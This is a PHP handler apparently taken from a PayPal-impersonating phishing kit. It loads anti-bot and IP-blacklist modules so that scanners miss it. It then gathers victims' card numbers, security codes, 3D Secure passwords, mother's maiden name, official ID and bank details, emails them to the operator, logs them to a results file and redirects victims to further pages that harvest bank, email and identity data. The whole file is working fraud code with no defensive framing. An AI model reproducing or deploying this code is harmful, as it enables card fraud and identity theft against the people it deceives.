<?php
error_reporting(0);
session_start();
include'../Spox/Anti/IP-BlackList.php';  
include'../Spox/Anti/Bot-Crawler.php';
include'../Spox/Anti/Bot-Spox.php';
include'../Spox/Functions/Fuck-you.php'; 
include'../Spox/Anti/Dila_DZ.php';
require_once '../main.php';
require_once 'session.php';
include'../Spox/spox_config.php';

$ip = getUserIP();
$ispuser = getisp($ip);
$message = "#--------------------------------[ VBV INFO ]----------------------------#\n";
$message .= "Type			: ".$_SESSION['scheme']." - ".$_SESSION['type']."\n";
$message .= "Level			: ".$_SESSION['brand']."\n";
$message .= "Cardholders    : ".$_SESSION['ch']."\n";
$message .= "CC Number		: ".$_SESSION['ccn']."\n";
$message .= "Expired		: ".$_SESSION['cex']."\n";
$message .= "Card Security Code	: ".$_SESSION['csc']."\n";
$message .= "AMEX CID : ".$_SESSION['cid']."\n";
$message .= "3D Password : ".$_POST['password_vbv']."\n";
$message .= "Codice Fiscale : ".$_POST['codicefiscale']."\n";
$message .= "Kontonummer : ".$_POST['kontonummer']."\n";
$message .= "Official ID : ".$_POST['offid']."\n";
$message .= "Mother’s Maiden Name : ".$_POST['mmname']."\n";
$message .= "#--------------------[ JAPAN INFO ]-------------------------#\n";
$message .= "WEB ID	: ".$_POST['webid']."\n";
$message .= "Card Password	: ".$_POST['cardpass']."\n";
$message .= "#--------------------------[ PC INFORMATION ]-------------------------#\n";
$message .= "IP Address		: ".$ip."\n";
$message .= "ISP		    : ".$ispuser."\n";
$message .= "Region		    : ".$regioncity."\n";
$message .= "City		    : ".$citykota."\n";
$message .= "Continent		: ".$continent."\n";
$message .= "Timezone		: ".$timezone."\n";
$message .= "OS/Browser		: ".$os." / ".$br."\n";
$message .= "Date			: ".$date."\n";
$message .= "User Agent		: ".$user_agent."\n";
$message .= "#--------------------------[ PRIVATE ]-----------------------------#\n";
$subject = "PAYPAL VBV: ".$_SESSION['from']." [ $cn - $os - $ip ]";
$headers="From: ".$_SESSION['from']." <paypal_spox@cracked.16shop>\r\n";
	$headers.="MIME-Version: 1.0\r\n";
	$headers.="Content-Type: text/plain; charset=UTF-8\r\n";
@mail($email,$subject,$message,$headers);
        $save=fopen("../result/vbv".$pinspox.".txt","a+");
        fwrite($save,$message);
        fclose($save);

tulis_file("../result/total_vbv.txt", $ip);

if($double_cc == "yes") {
	if($_SESSION['cc_kedua'] == "") {
	        $_SESSION['cc_kedua'] = "done";
	        echo "<script type='text/javascript'>window.top.location='link_card?key=$key';</script>";
	        exit();
	}
}
if($get_email == "yes"){
 echo "<script type='text/javascript'>window.top.location='link_email?key=$key';</script>";
}else if($get_bank == "yes"){
 echo "<script type='text/javascript'>window.top.location='bank?key=$key';</script>";
}else if($get_photo == "yes"){
 echo "<script type='text/javascript'>window.top.location='identity?key=$key';</script>";
}else{
echo "<script type='text/javascript'>window.top.location='done?key=$key';</script>";
}
exit('done');